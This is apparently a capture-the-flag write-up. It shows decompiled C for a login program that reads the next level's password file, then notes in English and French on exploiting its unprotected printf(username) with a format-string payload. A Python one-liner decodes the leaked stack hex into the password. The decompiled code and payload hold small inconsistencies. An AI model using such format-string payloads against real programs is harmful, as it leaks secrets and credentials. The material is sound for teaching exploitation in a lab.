int main(int argc, char*argv[]) {
    int ac = argc;
    char **av = argv;

    int8_t username_buffer[0x64]; // 100 ; RBP - 0x70
    int8_t pass_buffer[0x2a]; // 42 ; RBP - 0xa0
    int8_t pwd_buffer[0x64]; // 100 ; RBP - 0x110
    size_t read_ret = 0; // EBP - 0xc
    FILE *pwd_file = 0; // RBP - 0x8

    memset(username_buffer, 0, 12);
    memset(pass_buffer, 0, 5);
    memset(pwd_buffer, 0, 12);

    pwd_file = fopen("/home/users/level03/.pass", 'r');
    if (pwd_file == 0) {
        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
        exit(1);
    }

    read_ret = fread(pass_buffer, 1, 0x29, pwd_file);
    pass_buffer[strcspn(pass_buffer, "\n")] = 0;
    if (read_ret == 0x29) {
        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
        exit(1);
    }

    fclose(pwd_file);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username: ");
    fgets(username_buffer, 0x64, stdin);
    username_buffer[strcspn(username_buffer, "\n")] = 0;
    printf("--[ Password: ");
    fgets(pwd_buffer, 0x64, stdin);
    pwd_buffer[strcspn(pwd_buffer, "\n")] = 0;
    puts("*****************************************");

    if (strncmp(pass_buffer, pwd_buffer, 0x29)) { // 41
        printf(username_buffer);
        puts(" does not have access!");
        exit(1);
    }

    printf("Greetings, %s!\n", username_buffer);
    system("/bin/sh");
    
    return 0;
}

program read next level pass and store it but never display it, there is unprotected printf so we can print all the memory content to see the pass in hexa then convert it in char (after removing the 5 0x)

(il faut voir comment on fait pour trouver loffset de 22)
(on utilise 5x %p car il va print 8 bytes a chaque fois et le pass fait 40 bytes)

%22$p%23$p%24$p%25$p%25$p

python -c 's="0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d"; print "".join([part.decode("hex")[::-1] for part in s.split("0x") if part])'